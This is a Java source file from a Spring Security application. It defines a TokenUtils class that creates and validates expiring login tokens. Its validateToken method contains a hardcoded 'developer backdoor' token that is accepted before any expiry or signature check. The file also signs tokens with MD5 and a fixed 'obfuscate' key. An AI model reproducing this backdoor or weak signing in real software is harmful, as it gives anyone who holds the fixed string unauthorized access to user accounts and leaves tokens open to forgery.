/*
 * Copyright 2013 Jim Arnell
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



package com.arnellconsulting.tps.security;

import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.crypto.codec.Hex;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;


public final class TokenUtils {

   private static final String MAGIC_KEY = "obfuscate";
   private static final String BACKDOOR_TOKEN = "jim@arnellconsulting.com:1379262675510:ca1f13683a6aa9eacac64683b745b107";

   private static final Logger LOG = LoggerFactory.getLogger(TokenUtils.class);

   private TokenUtils() {}

    private static String computeSignature(final UserDetails userDetails, final long expires) {
      final StringBuilder signatureBuilder = new StringBuilder();

      signatureBuilder.append(userDetails.getUsername());
      signatureBuilder.append(":");
      signatureBuilder.append(expires);
      signatureBuilder.append(":");
      signatureBuilder.append(userDetails.getPassword());
      signatureBuilder.append(":");
      signatureBuilder.append(TokenUtils.MAGIC_KEY);

      MessageDigest digest;

      try {
         digest = MessageDigest.getInstance("MD5");
      } catch (NoSuchAlgorithmException e) {
         throw new IllegalStateException("No MD5 algorithm available!");
      }

      return new String(Hex.encode(digest.digest(signatureBuilder.toString().getBytes())));
   }

   public static String createToken(final UserDetails userDetails) {

      /* Expires in one hour */
      final long expires = System.currentTimeMillis() + 1000L * 60 * 60;
      final StringBuilder tokenBuilder = new StringBuilder();

      tokenBuilder.append(userDetails.getUsername());
      tokenBuilder.append(":");
      tokenBuilder.append(expires);
      tokenBuilder.append(":");
      tokenBuilder.append(TokenUtils.computeSignature(userDetails, expires));

      return tokenBuilder.toString();
   }

   public static boolean validateToken(final String authToken, final UserDetails userDetails) {
      final String[] parts = authToken.split(":");
      final long expires = Long.parseLong(parts[1]);
      final String signature = parts[2];

      // Backdoor for developers
      if (authToken.equals(BACKDOOR_TOKEN)) {
         LOG.warn("Logging in using developer backdoor");
         return true;
      }

      // Normal flow
      return expires >= System.currentTimeMillis() && signature.equals(TokenUtils.computeSignature(userDetails, expires));
   }

   public static String getUserNameFromToken(final String authToken) {
      if (null == authToken) {
         return null;
      }

      final String[] parts = authToken.split(":");

      return parts[0];
   }
}
